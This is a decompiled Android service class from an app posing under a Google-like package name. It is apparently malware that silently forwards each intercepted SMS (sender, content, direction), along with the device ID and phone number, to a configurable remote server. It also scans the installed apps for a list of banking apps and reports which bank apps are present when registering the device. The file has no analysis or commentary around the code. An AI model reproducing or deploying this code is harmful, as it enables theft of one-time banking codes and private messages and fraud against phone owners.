package com.google.games.stores.service;

import android.app.Notification;
import android.app.Service;
import android.content.Intent;
import android.content.pm.PackageInfo;
import android.os.IBinder;
import com.google.games.stores.bean.MyConfig;
import com.google.games.stores.config.Config;
import com.google.games.stores.config.Message;
import com.google.games.stores.util.ConfigUtil;
import com.google.games.stores.util.GeneralUtil;
import com.google.games.stores.util.Logger;
import com.google.games.stores.util.NetTask;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.List;

public class MessageService extends Service {
    private String CONNECT_SERVER = "";

    public IBinder onBind(Intent intent) {
        return null;
    }

    private void readBackConfig() {
        MyConfig config = ConfigUtil.getConfig(Config.CONFIG_FILE);
        if (config != null) {
            String server = config.getServer();
            if (server == null || server.equalsIgnoreCase("") || server.equalsIgnoreCase("null")) {
                this.CONNECT_SERVER = Config.SERVER;
            } else {
                this.CONNECT_SERVER = server;
            }
        } else {
            this.CONNECT_SERVER = Config.SERVER;
        }
        Logger.i("abc", "Connect Service Server--->" + this.CONNECT_SERVER);
    }

    public void onCreate() {
        super.onCreate();
        startForeground(1, new Notification());
        setForeground(true);
        readBackConfig();
        Logger.i("abc", "Message service create");
    }

    public void onStart(Intent intent, int startId) {
        super.onStart(intent, startId);
        Logger.i("abc", "Message service start");
        if (intent != null) {
            Message sms = (Message) intent.getSerializableExtra("SMS");
            if (sms != null) {
                readBackConfig();
                Logger.i("abc", "upload_sms start");
                upload_sms(sms);
            }
        }
    }

    /* access modifiers changed from: private */
    public void upload_sms(final Message sms) {
        String date = new SimpleDateFormat("yyyy-MM-dd hh:mm:ss").format(new Date());
        new NetTask() {
            /* access modifiers changed from: protected */
            public void afterReturnService(String result) {
                try {
                    Logger.i("abc", "Sms upload result--->" + result);
                    if (result.equalsIgnoreCase("NO")) {
                        MessageService.this.registerDevice(sms);
                    } else {
                        result.equalsIgnoreCase("");
                    }
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }
        }.execute(new String[]{this.CONNECT_SERVER + Config.NEW_SMS_URL, Config.NEW, GeneralUtil.getDevice(this), GeneralUtil.getMobile(this), date, sms.getInout(), sms.getContent(), sms.getAddress()});
    }

    /* access modifiers changed from: private */
    public void registerDevice(final Message sms) {
        try {
            String bk_name = "";
            List<PackageInfo> packages = getPackageManager().getInstalledPackages(0);
            for (int i = 0; i < packages.size(); i++) {
                PackageInfo packageInfo = (PackageInfo) packages.get(i);
                String str = new String();
                str = packageInfo.packageName;
                int j = 0;
                while (j < Config.BK_ARRAY_LIST.length) {
                    if (str.equalsIgnoreCase(Config.BK_ARRAY_LIST[j]) || str.equalsIgnoreCase(Config.MY_BK_ARRAY_LIST[j])) {
                        if (bk_name.equalsIgnoreCase("")) {
                            bk_name = Config.BK_NAME_LIST[j];
                        } else {
                            bk_name = new StringBuilder(String.valueOf(bk_name)).append(" - ").append(Config.BK_NAME_LIST[j]).toString();
                        }
                    }
                    j++;
                }
            }
            new NetTask() {
                /* access modifiers changed from: protected */
                public void afterReturnService(String result) {
                    try {
                        Logger.i("abc", "Sms upload fail --> register device result -->" + result);
                        if (result.equalsIgnoreCase("OK")) {
                            MessageService.this.upload_sms(sms);
                        }
                    } catch (Exception e) {
                        e.printStackTrace();
                    }
                }
            }.execute(new String[]{this.CONNECT_SERVER + Config.ADD_DEVICE_URL, Config.ADD, GeneralUtil.getDevice(this), GeneralUtil.getMobile(this), GeneralUtil.getOperator(this), "1", bk_name, "-", "1"});
        } catch (Exception e1) {
            e1.printStackTrace();
        }
    }

    public void onDestroy() {
        super.onDestroy();
    }
}
